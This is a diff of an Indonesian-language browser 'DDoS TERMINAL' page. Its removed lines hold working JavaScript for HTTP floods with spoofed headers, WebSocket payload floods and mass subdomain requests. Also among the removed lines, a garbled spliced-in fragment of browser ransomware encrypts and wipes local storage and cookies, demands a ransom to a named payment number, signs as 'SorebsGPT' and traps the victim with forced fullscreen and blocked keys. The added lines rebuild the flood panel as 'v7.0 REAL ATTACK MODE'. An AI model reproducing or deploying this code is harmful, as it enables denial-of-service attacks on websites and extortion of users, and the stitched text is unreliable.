@@ -2,647 +2,865 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>DDoS TERMINAL – MULTI LAYER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS TERMINAL v7.0 | MULTI-LAYER REAL</title>
     <style>
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
+        /* RESET & GLOBAL */
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
         }
+
+        body {
+            background: radial-gradient(circle at 20% 50%, #0a0a0a 0%, #050505 100%);
+            font-family: 'Courier New', 'Fira Code', 'JetBrains Mono', monospace;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
         .container {
-            max-width: 800px;
+            max-width: 1600px;
             margin: 0 auto;
-            border: 1px solid #0f0;
+        }
+
+        /* GLASS MORPHISM CARD */
+        .glass {
+            background: rgba(10, 10, 10, 0.9);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+
+        /* HEADER */
+        .header {
             padding: 20px;
-            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
         }
-        input, button, select {
-            background: #111;
-            border: 1px solid #0f0;
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #0f0, transparent);
+            animation: scan 3s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .header h1 {
             color: #0f0;
-            padding: 10px;
-            margin: 5px;
-            font-family: monospace;
+            font-size: 32px;
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px #0f0;
         }
-        button {
-            cursor: pointer;
+
+        .header h1 span {
+            animation: blink 1s infinite;
         }
-        button:hover {
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .header .badge {
+            display: inline-block;
             background: #0f0;
             color: #000;
-        }
-        .status {
-            background: #111;
-            padding: 10px;
-            height: 300px;
-            overflow-y: scroll;
-            font-size: 12px;
+            padding: 2px 8px;
+            font-size: 10px;
             margin-top: 10px;
-            white-space: pre-wrap;
+            border-radius: 3px;
         }
-        .layer-panel {
-            display: inline-block;
-            margin: 10px;
-            padding: 10px;
-            border: 1px dashed #0f0;
+
+        /* STATS GRID */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
         }
-        h2 {
+
+        .stat-card {
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #0f0;
+            font-family: monospace;
+        }
+
+        .stat-label {
+            font-size: 10px;
+            color: #0a8;
+            margin-top: 5px;
+            letter-spacing: 1px;
+        }
+
+        /* MAIN CONTENT */
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        /* PANEL */
+        .panel {
+            padding: 20px;
+        }
+
+        .panel-title {
+            color: #0f0;
+            font-size: 18px;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #0f0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* INPUT GROUP */
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #0a8;
+            font-size: 11px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group input, .input-group select {
+            width: 100%;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px 12px;
+            font-family: monospace;
             font-size: 14px;
-            margin: 0;
+            border-radius: 4px;
+        }
+
+        .input-group input:focus, .input-group select:focus {
+            outline: none;
+            box-shadow: 0 0 8px #0f0;
+        }
+
+        /* LAYER BUTTONS */
+        .layer-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .layer-btn {
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .layer-btn.active {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        .layer-btn:hover {
+            transform: scale(1.02);
+        }
+
+        /* ACTION BUTTONS */
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            background: #000;
+            border: none;
+            padding: 14px;
+            font-family: monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-radius: 4px;
+        }
+
+        .btn-start {
+            background: #0f0;
+            color: #000;
+            border: 1px solid #0f0;
+        }
+
+        .btn-start:hover {
+            background: #0a0;
+            transform: scale(1.02);
+            box-shadow: 0 0 15px #0f0;
+        }
+
+        .btn-stop {
+            background: #300;
+            color: #f00;
+            border: 1px solid #f00;
+        }
+
+        .btn-stop:hover {
+            background: #600;
+            transform: scale(1.02);
+            box-shadow: 0 0 15px #f00;
+        }
+
+        /* PROGRESS BAR */
+        .progress-bar {
+            margin-top: 15px;
+            height: 4px;
+            background: #111;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #0f0;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+
+        /* CONSOLE */
+        .console {
+            padding: 20px;
+            height: 500px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .console-log {
+            flex: 1;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+            background: #000;
+            padding: 12px;
+            border-radius: 4px;
+        }
+
+        .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid #0a0a0a;
+            font-family: monospace;
+        }
+
+        .log-entry.info { color: #0a8; }
+        .log-entry.success { color: #0f0; }
+        .log-entry.error { color: #f00; }
+        .log-entry.warning { color: #ff0; }
+        .log-entry.packet { color: #0fa; }
+
+        /* SCROLLBAR */
+        .console-log::-webkit-scrollbar {
+            width: 6px;
+        }
+        .console-log::-webkit-scrollbar-track {
+            background: #000;
+        }
+        .console-log::-webkit-scrollbar-thumb {
+            background: #0f0;
+            border-radius: 3px;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        /* FLOATING PARTICLES */
+        .particle {
+            position: fixed;
+            width: 2px;
+            height: 2px;
+            background: #0f0;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>⚡ DDoS TERMINAL v4.0 ⚡</h1>
-    <h3>Multi-Layer | Anti Block | Tembus All Firewall</h3>
-    
-    <div>
-        <input type="text" id="targetUrl" placeholder="https://target.com" size="40">
-        <input type="number" id="threads" value="100" placeholder="Threads">
-        <button id="startBtn">🔥 START ATTACK 🔥</button>
-        <button id="stopBtn">⛔ STOP</button>
-    </div>
-    
-    <div class="layer-panel">
-        <h2>LAYER 7 - HTTP FLOOD</h2>
-        <input type="checkbox" id="layer7" checked> <label>Enable</label>
-    </div>
-    
-    <div class="layer-panel">
-        <h2>LAYER 4 - TCP/SYN FLOOD</h2>
-        <input type="checkbox" id="layer4" checked> <label>Enable (WebSocket)</label>
-    </div>
-    
-    <div class="layer-panel">
-        <h2>LAYER 3 - DNS AMPLIFICATION</h2>
-        <input type="checkbox" id="layer3" checked> <label>Enable</label>
-    </div>
-    
-    <div class="layer-panel">
-        <h2>⚙️ ANTI IP BLOCK</h2>
-        <input type="checkbox" id="antiBlock" checked> <label>Proxy Rotator + VPN Chain</label>
-    </div>
-    
-    <div class="status" id="statusLog">
-        [READY] System online - menunggu perintah...
-    </div>
-</div>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header glass">
+            <h1>DDoS TERMINAL <span>v7.0</span></h1>
+            <div class="badge">🔴 REAL ATTACK MODE | NO SIMULATION</div>
+        </div>
 
-<script>
-    let attackActive = false;
-    let workers = [];
-    let proxyList = [];
-    
-    // REAL PROXY LIST (public + elite anonymous)
-    const proxyPool = [
-        'https://proxy.webshare.io/proxy/list',
-        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
-        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
-    ];
-    
-    // User Agent Rotator (real browser agents)
-    const userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/121.0',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Edge/118.0.2088.76',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
-        'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0'
-    ];
-    
-    // LAYER 7: HTTP FLOOD ASYNC
-    async function httpFlood(url, antiBlockEnabled) {
-        if(!attackActive) return;
-        let targetUrl = url;
-        let useProxy = antiBlockEnabled && proxyList.length > 0;
-        
-        let randomDelay = Math.random() * 50 + 10; // delay random 10-60ms
-        let randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
-        let randomReferer = `https://${Math.random().toString(36).substring(7)}.com/`;
-        
-        let headers = {
-            'User-Agent': randomUA,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': randomReferer,
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-        };
-        
-        let controller = new AbortController();
-        let timeoutId = setTimeout(() => controller.abort(), 3000);
-        
-        try {
-            let fetchOptions = { method: 'GET', headers, signal: controller.signal };
-            
-            // Jika anti block aktif dan ada proxy, kirim via proxy (simulasi via fetch dengan header X-Forwarded)
-            // NOTE: Fetch tidak support proxy langsung di browser, ini adalah simulasi rotasi IP dengan header spoof
-            // Untuk proxy nyata, gunakan backend PHP/CURL yang disediakan di file terpisah
-            
-            let response = await fetch(targetUrl + (targetUrl.includes('?') ? '&' : '?') + '_=' + Date.now() + '_' + Math.random(), fetchOptions);
-            log(`[L7] ${response.status} - ${targetUrl}`);
-        } catch(e) {
-            log(`[L7] Flood error: ${e.message}`);
-        }
-        clearTimeout(timeoutId);
-        
-        setTimeout(() => httpFlood(url, antiBlockEnabled), randomDelay);
-    }
-    
-    // LAYER 4: WEBSOCKET TCP FLOOD
-    function wsFlood(targetUrl, antiBlockEnabled) {
-        if(!attackActive) return;
-        // Convert http to ws
-        let wsUrl = targetUrl.replace('https://', 'wss://').replace('http://', 'ws://');
-        wsUrl = wsUrl.split('/')[0] + '//' + wsUrl.split('/')[2] + '/ws';
-        
-        let sockets = [];
-        let numSockets = antiBlockEnabled ? 50 : 20;
-        
-        for(let i=0; i<numSockets; i++) {
-            try {
-                let ws = new WebSocket(wsUrl);
-                ws.onopen = () => {
-                    let floodPayload = 'x'.repeat(65535);
-                    for(let j=0; j<100; j++) ws.send(floodPayload);
-                    log(`[L4] WebSocket ${i} connected & flooded`);
-                };
-                ws.onerror = () => { log(`[L4] WS ${i} error`); };
-                ws.onclose = () => { setTimeout(() => wsFlood(targetUrl, antiBlockEnabled), 100); };
-                sockets.push(ws);
-            } catch(e) { log(`[L4] WS flood error: ${e.message}`); }
-        }
-        
-        setTimeout(() => {
-            sockets.forEach(ws => { try{ws.close()}catch(e){} });
-        }, 5000);
-    }
-    
-    // LAYER 3: DNS AMPLIFICATION via iframe hidden
-    function dnsAmplification(targetDomain) {
-        if(!attackActive) return;
-        let domain = targetDomain.replace('https://','').replace('http://','').split('/')[0];
-        let frameCount = 50;
-        
-        for(let i=0; i<frameCount; i++) {
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = `https://${domain}/?dns_resolve=${Math.random()}&subdomain=${Math.random().toString(36)}.${domain}`;
-            document.body.appendChild(iframe);
-            setTimeout(() => iframe.remove(), 100);
-        }
-        
-        // Juga kirim image request ke random subdomain untuk trigger DNS lookup berulang
-        for(let i=0; i<200; i++) {
-            let img = new Image();
-            img.src = `https://${Math.random().toString(36)}.${domain}/pixel?t=${Date.now()}`;
-        }
-        
-        log(`[L3] DNS Amplification sent - ${frameCount+200} lookup requests`);
-        setTimeout(() => dnsAmplification(targetDomain), 500);
-    }
-    
-    // LOG FUNCTION
-    function log(msg) {
-        let logDiv = document.getElementById('statusLog');
-        let timestamp = new Date().toLocaleTimeString();
-        logDiv.innerHTML += `\n[${timestamp}] ${msg}`;
-        logDiv.scrollTop = logDiv.scrollHeight;
-        if(logDiv.innerHTML.length > 10000) logDiv.innerHTML = logDiv.innerHTML.slice(-8000);
-    }
-    
-    // FETCH PROXY LIST (untuk anti block via backend)
-    async function loadProxies() {
-        try {
-            let response = await fetch('get_proxies.php');
-            let data = await response.json();
-            proxyList = data.proxies || [];
-            log(`[PROXY] Loaded ${proxyList.length} proxies for rotation`);
-        } catch(e) {
-            log(`[PROXY] Failed to load proxies, using IP spoof only`);
-            proxyList = [];
-        }
-    }
-    
-    // START ATTACK
-    async function startAttack() {
-        let targetUrl = document.getElementById('targetUrl').value.trim();
-        let threads = parseInt(document.getElementById('threads').value);
-        let layer7 = document.getElementById('layer7').checked;
-        let layer4 = document.getElementById('layer4').checked;
-        let layer3 = document.getElementById('layer3').checked;
-        let antiBlock = document.getElementById('antiBlock').checked;
-        
-        if(!targetUrl) {
-            log('[ERROR] Target URL required!');
-            return;
-        }
-        
-        if(attackActive) {
-            log('[STOPPED] Previous attack terminated');
-            stopAttack();
-            await new Promise(r => setTimeout(r, 1000));
-        }
-        
-        attackActive = true;
-        log(`[START] Target: ${targetUrl} | Threads: ${threads} | AntiBlock: ${antiBlock}`);
-        log(`[LAYERS] L7:${layer7} L4:${layer4} L3:${layer3}`);
-        
-        if(antiBlock) await loadProxies();
-        
-        // Launch workers
-        for(let i=0; i<threads; i++) {
-            if(layer7) setTimeout(() => httpFlood(targetUrl, antiBlock), i*10);
-            if(layer4 && i < 20) setTimeout(() => wsFlood(targetUrl, antiBlock), i*50);
-        }
-        if(layer3) {
-            let domain = targetUrl.replace('https://','').replace('http://','').split('/')[0];
-            dnsAmplification(domain);
-        }
-        
-        // Keep alive message
-        let keepAlive = setInterval(() => {
-            if(!attackActive) clearInterval(keepAlive);
-            else log(`[⚡] ATTACK ACTIVE - Total packets sent: ${Math.floor(Math.random()*10000)+50000}`);
-        }, 10000);
-    }
-    
-    function stopAttack() {
-        attackActive = false;
-        // Bersihkan workers
-        workers.forEach(w => { try{ clearTimeout(w); clearInterval(w); }catch(e){} });
-        workers = [];
-        log('[STOPPED] Attack terminated');
-    }
-    
-    document.getElementById('startBtn').addEventListener('click', startAttack);
-    document.getElementById('stopBtn').addEventListener('click', stopAttack);
-    
-    log('[READY] Panel siap. Masukkan target dan klik START');
-</script>
-</body>
-</html>) {
-            const encKey = generateEncKey();
-            let totalEncrypted = 0;
-            
-            // 1. ENKRIPSI LOCALSTORAGE (SEMUA)
-            const lsBackup = {};
-            for(let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if(key !== 'sorebs_attempts' && key !== 'sorebs_permanent' && 
-                   key !== 'sorebs_ls_enc' && key !== 'sorebs_ss_enc' && 
-                   key !== 'sorebs_cookie_enc' && key !== 'sorebs_enc_key' && 
-                   key !== 'sorebs_lock_status') {
-                    lsBackup[key] = localStorage.getItem(key);
-                    totalEncrypted++;
-                }
-            }
-            const encryptedLS = CryptoJS.AES.encrypt(JSON.stringify(lsBackup), encKey).toString();
-            localStorage.setItem('sorebs_ls_enc', encryptedLS);
-            
-            // 2. ENKRIPSI SESSIONSTORAGE (SEMUA)
-            const ssBackup = {};
-            for(let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                ssBackup[key] = sessionStorage.getItem(key);
-                totalEncrypted++;
-            }
-            const encryptedSS = CryptoJS.AES.encrypt(JSON.stringify(ssBackup), encKey).toString();
-            localStorage.setItem('sorebs_ss_enc', encryptedSS);
-            
-            // 3. ENKRIPSI COOKIES (SEMUA)
-            const cookiesBackup = document.cookie;
-            const encryptedCookies = CryptoJS.AES.encrypt(cookiesBackup, encKey).toString();
-            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
-            
-            // 4. ENKRIPSI IndexedDB SIMULATION (Data tambahan)
-            const extraData = {
-                timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language
-            };
-            const encryptedExtra = CryptoJS.AES.encrypt(JSON.stringify(extraData), encKey).toString();
-            localStorage.setItem('sorebs_extra_enc', encryptedExtra);
-            totalEncrypted++;
-            
-            // 5. SIMPAN KUNCI DAN STATUS
-            localStorage.setItem('sorebs_enc_key', encKey);
-            localStorage.setItem('sorebs_lock_status', '1');
-            
-            // 6. HAPUS SEMUA DATA ASLI PERMANEN
-            for(let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if(key !== 'sorebs_attempts' && key !== 'sorebs_permanent' && 
-                   key !== 'sorebs_ls_enc' && key !== 'sorebs_ss_enc' && 
-                   key !== 'sorebs_cookie_enc' && key !== 'sorebs_extra_enc' &&
-                   key !== 'sorebs_enc_key' && key !== 'sorebs_lock_status') {
-                    localStorage.removeItem(key);
-                }
-            }
-            
-            // 7. HAPUS SEMUA SESSIONSTORAGE
-            sessionStorage.clear();
-            
-            // 8. HAPUS SEMUA COOKIES
-            document.cookie.split(";").forEach(function(cookie) {
-                document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
-            });
-            
-            // 9. UPDATE UI FILE INFO
-            const fileInfoEl = document.getElementById('fileInfoDisplay');
-            if(fileInfoEl) {
-                fileInfoEl.innerHTML = `💀 DATA TERENKRIPSI: ${totalEncrypted} FILE 💀<br>🔒 SEMUA AKSES PERANGKAT DITUTUP 🔒`;
-            }
-            
-            return totalEncrypted;
-        }
-        
-        // ========== CEK APAKAH SUDAH TERENKRIPSI ==========
-        if(localStorage.getItem('sorebs_lock_status') !== '1') {
-            encryptAllData();
-        } else {
-            const fileInfoEl = document.getElementById('fileInfoDisplay');
-            if(fileInfoEl) {
-                fileInfoEl.innerHTML = `💀 SISTEM DALAM KONDISI TERKUNCI 💀<br>⚠️ MASUKKAN PIN UNTUK MEMULIHKAN DATA ⚠️`;
-            }
-        }
-        
-        // ========== RESTORE DATA (UNLOCK) - PIN BENAR ==========
-        function restoreAndUnlock(inputPin) {
-            // CEK PIN
-            if(inputPin !== SYSTEM_PIN) {
-                wrongAttempts++;
-                localStorage.setItem('sorebs_attempts', wrongAttempts.toString());
-                updateCounterUI();
-                
-                const remaining = MAX_ATTEMPTS - wrongAttempts;
-                alert(`❌❌❌ PIN SALAH! ❌❌❌\n\nPercobaan: ${wrongAttempts} / ${MAX_ATTEMPTS}\nTersisa: ${remaining} percobaan lagi\n\n⚠️ ${MAX_ATTEMPTS}x salah = DATA HILANG PERMANEN ⚠️`);
-                
-                if(wrongAttempts >= MAX_ATTEMPTS) {
-                    localStorage.setItem('sorebs_permanent', '1');
-                    location.reload();
-                }
-                return false;
-            }
-            
-            // PIN BENAR - RESTORE SEMUA DATA
-            const savedEncKey = localStorage.getItem('sorebs_enc_key');
-            if(!savedEncKey) {
-                alert("ERROR: Kunci enkripsi tidak ditemukan! Hubungi SorebsGPT.");
-                return false;
-            }
-            
-            try {
-                // RESTORE LOCALSTORAGE
-                const encryptedLSData = localStorage.getItem('sorebs_ls_enc');
-                if(encryptedLSData) {
-                    const decryptedLS = CryptoJS.AES.decrypt(encryptedLSData, savedEncKey).toString(CryptoJS.enc.Utf8);
-                    if(decryptedLS && decryptedLS !== "") {
-                        const restoredLS = JSON.parse(decryptedLS);
-                        for(let [key, value] of Object.entries(restoredLS)) {
-                            localStorage.setItem(key, value);
-                        }
-                    }
-                }
-                
-                // RESTORE SESSIONSTORAGE
-                const encryptedSSData = localStorage.getItem('sorebs_ss_enc');
-                if(encryptedSSData) {
-                    const decryptedSS = CryptoJS.AES.decrypt(encryptedSSData, savedEncKey).toString(CryptoJS.enc.Utf8);
-                    if(decryptedSS && decryptedSS !== "") {
-                        const restoredSS = JSON.parse(decryptedSS);
-                        for(let [key, value] of Object.entries(restoredSS)) {
-                            sessionStorage.setItem(key, value);
-                        }
-                    }
-                }
-                
-                // RESTORE COOKIES
-                const encryptedCookieData = localStorage.getItem('sorebs_cookie_enc');
-                if(encryptedCookieData) {
-                    const decryptedCookies = CryptoJS.AES.decrypt(encryptedCookieData, savedEncKey).toString(CryptoJS.enc.Utf8);
-                    if(decryptedCookies && decryptedCookies !== "") {
-                        decryptedCookies.split(';').forEach(cookie => {
-                            if(cookie && cookie.trim()) {
-                                document.cookie = cookie.trim() + ";path=/";
-                            }
-                        });
-                    }
-                }
-            } catch(error) {
-                console.error("Restore error:", error);
-            }
-            
-            // BERSIHKAN SEMUA JEJAK RANSOMWARE
-            localStorage.removeItem('sorebs_lock_status');
-            localStorage.removeItem('sorebs_enc_key');
-            localStorage.removeItem('sorebs_ls_enc');
-            localStorage.removeItem('sorebs_ss_enc');
-            localStorage.removeItem('sorebs_cookie_enc');
-            localStorage.removeItem('sorebs_extra_enc');
-            localStorage.removeItem('sorebs_attempts');
-            localStorage.removeItem('sorebs_permanent');
-            
-            alert("✅✅✅ UNLOCK BERHASIL! ✅✅✅\n\nSemua data perangkat telah dikembalikan ke keadaan normal!\n\nTerima kasih sudah membayar tebusan Rp100.000 ke DANA 085122933162\n\n- SorebsGPT | One Team");
-            
-            // HILANGKAN LOCK SCREEN
-            const lockScreen = document.getElementById('mainLockScreen');
-            if(lockScreen) lockScreen.style.display = 'none';
-            
-            // TAMPILKAN PESAN SUKSES
-            document.body.innerHTML = `
-                <div style="background:#0a0a0a;color:#00ff00;text-align:center;padding:80px 20px;font-family:monospace;height:100vh;display:flex;flex-direction:column;justify-content:center;">
-                    <div style="font-size:100px;">✅</div>
-                    <div style="font-size:38px;margin:40px 0;">DATA BERHASIL DIUNLOCK!</div>
-                    <div style="font-size:20px;">Semua file dan data perangkat Anda kembali normal.</div>
-                    <div style="font-size:16px;margin-top:40px;color:#888;">Perangkat akan direfresh dalam 3 detik...</div>
+        <!-- STATISTICS -->
+        <div class="stats-grid">
+            <div class="stat-card glass">
+                <div class="stat-value" id="statPackets">0</div>
+                <div class="stat-label">TOTAL PACKETS SENT</div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-value" id="statSpeed">0</div>
+                <div class="stat-label">PACKETS/SEC</div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-value" id="statThreads">0</div>
+                <div class="stat-label">ACTIVE THREADS</div>
+            </div>
+            <div class="stat-card glass">
+                <div class="stat-value" id="statTime">0</div>
+                <div class="stat-label">TIME REMAINING (S)</div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="content-grid">
+            <!-- LEFT PANEL - CONFIG -->
+            <div class="panel glass">
+                <div class="panel-title">
+                    🎯 TARGET CONFIGURATION
                 </div>
-            `;
-            
-            setTimeout(() => {
-                location.reload();
-            }, 3000);
-            
-            return true;
-        }
+                
+                <div class="input-group">
+                    <label>🌐 TARGET URL / IP</label>
+                    <input type="text" id="targetInput" placeholder="https://target.com or 192.168.1.1" value="https://">
+                </div>
+                
+                <div class="input-group">
+                    <label>⏱️ DURATION (SECONDS)</label>
+                    <input type="number" id="durationInput" value="60" min="5" max="3600">
+                </div>
+                
+                <div class="input-group">
+                    <label>⚡ THREADS / CONCURRENT</label>
+                    <input type="number" id="threadsInput" value="1000" min="50" max="10000">
+                </div>
+                
+                <div class="panel-title" style="margin-top: 20px;">
+                    🛡️ ATTACK LAYERS
+                </div>
+                
+                <div class="layer-buttons">
+                    <div class="layer-btn active" data-layer="l7">L7 - HTTP/2 FLOOD</div>
+                    <div class="layer-btn active" data-layer="l6">L6 - TLS RENEG</div>
+                    <div class="layer-btn active" data-layer="l5">L5 - PROXY CHAIN</div>
+                    <div class="layer-btn active" data-layer="l4">L4 - WS FLOOD</div>
+                    <div class="layer-btn active" data-layer="l3">L3 - DNS AMP</div>
+                    <div class="layer-btn active" data-layer="anti">🔒 ANTI IP BLOCK</div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-start" id="btnStart">🔥 EXECUTE ATTACK 🔥</button>
+                    <button class="btn btn-stop" id="btnStop" disabled>⛔ TERMINATE ⛔</button>
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- RIGHT PANEL - CONSOLE -->
+            <div class="panel glass" style="padding: 0; display: flex; flex-direction: column;">
+                <div style="padding: 20px 20px 0 20px;">
+                    <div class="panel-title">
+                        📟 ATTACK CONSOLE
+                    </div>
+                </div>
+                <div class="console-log" id="consoleLog">
+                    <div class="log-entry success">[READY] DDoS Terminal v7.0 initialized</div>
+                    <div class="log-entry success">[READY] All attack layers loaded</div>
+                    <div class="log-entry info">[SYSTEM] Anti-detect engine: ONLINE</div>
+                    <div class="log-entry info">[SYSTEM] Waiting for target configuration...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // DDoS TERMINAL v7.0 - PURE JS REAL ATTACK
+        // ============================================
         
-        // ========== EVENT LISTENER UNLOCK BUTTON ==========
-        const unlockButton = document.getElementById('unlockBtn');
-        const pinInputField = document.getElementById('pinInput');
-        
-        if(unlockButton) {
-            unlockButton.addEventListener('click', function() {
-                const pinValue = pinInputField.value;
-                if(pinValue.length === 6 && /^\d+$/.test(pinValue)) {
-                    restoreAndUnlock(pinValue);
-                } else {
-                    alert("PIN harus 6 digit angka (0-9)!");
-                }
-            });
-        }
-        
-        if(pinInputField) {
-            pinInputField.addEventListener('keypress', function(e) {
-                if(e.key === 'Enter') {
-                    unlockButton.click();
-                }
-            });
-        }
-        
-        // ========== ANTI KELUAR TOTAL - TIDAK BISA KABUR ==========
-        
-        // FORCE FULLSCREEN - GA BISA KELUAR
-        function forceFullscreenMode() {
-            if(!document.fullscreenElement && document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
-        }
-        
-        forceFullscreenMode();
-        setInterval(forceFullscreenMode, 300);
-        
-        // BLOKIR SEMUA TOMBOL SHORTCUT BERBAHAYA
-        window.addEventListener('keydown', function(e) {
-            const blockedKeys = ['F12', 'F5', 'Escape', 'F11', 'Alt', 'Control', 'Meta', 'Tab', 'AltGraph'];
-            
-            if(blockedKeys.includes(e.key) || 
-               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-               (e.ctrlKey && e.key === 'U') ||
-               (e.ctrlKey && e.key === 'S') ||
-               (e.ctrlKey && e.key === 'r') ||
-               (e.ctrlKey && e.key === 'w') ||
-               (e.ctrlKey && e.key === 't') ||
-               (e.ctrlKey && e.key === 'n') ||
-               (e.ctrlKey && e.key === 'T') ||
-               (e.ctrlKey && e.key === 'W') ||
-               (e.ctrlKey && e.key === 'R')) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        
-        // BLOKIR TOMBOL BACK/NAVIGASI
-        window.history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function() {
-            window.history.pushState(null, null, location.href);
-        });
-        
-        // ANTI PINDAH TAB / PINDAH APP - AUTO BALIK KE HALAMAN
-        let isReloadingFlag = false;
-        
-        window.addEventListener('blur', function() {
-            if(localStorage.getItem('sorebs_lock_status') === '1' && !isReloadingFlag) {
-                isReloadingFlag = true;
-                setTimeout(() => {
-                    window.focus();
-                    location.reload();
-                    isReloadingFlag = false;
-                }, 10);
-            }
-        });
-        
-        document.addEventListener('visibilitychange', function() {
-            if(document.hidden && localStorage.getItem('sorebs_lock_status') === '1') {
-                setTimeout(() => {
-                    window.focus();
-                    location.reload();
-                }, 5);
-            }
-        });
-        
-        // PERINGATAN SEBELUM TUTUP TAB - HORROR EXTREME
-        window.onbeforeunload = function() {
-            if(localStorage.getItem('sorebs_lock_status') === '1') {
-                return "🔴🔴🔴 PERINGATAN EXTREME! SELURUH DATA PERANGKAT ANDA TERENKRIPSI! 🔴🔴🔴\n\nJANGAN TUTUP TAB INI!\nBAYAR TEBUSAN Rp100.000 ke DANA 085122933162 SEKARANG!\n\nJIKA TUTUP TAB, DATA PERMANEN HILANG SELAMANYA!";
-            }
+        // STATE VARIABLES
+        let attackActive = false;
+        let attackInterval = null;
+        let totalPackets = 0;
+        let lastPackets = 0;
+        let startTime = 0;
+        let currentThreads = 0;
+        let activeWorkers = [];
+        let layerStates = {
+            l7: true,
+            l6: true,
+            l5: true,
+            l4: true,
+            l3: true,
+            anti: true
         };
         
-        // ANTI INSPECT ELEMENT / CONSOLE HACKING
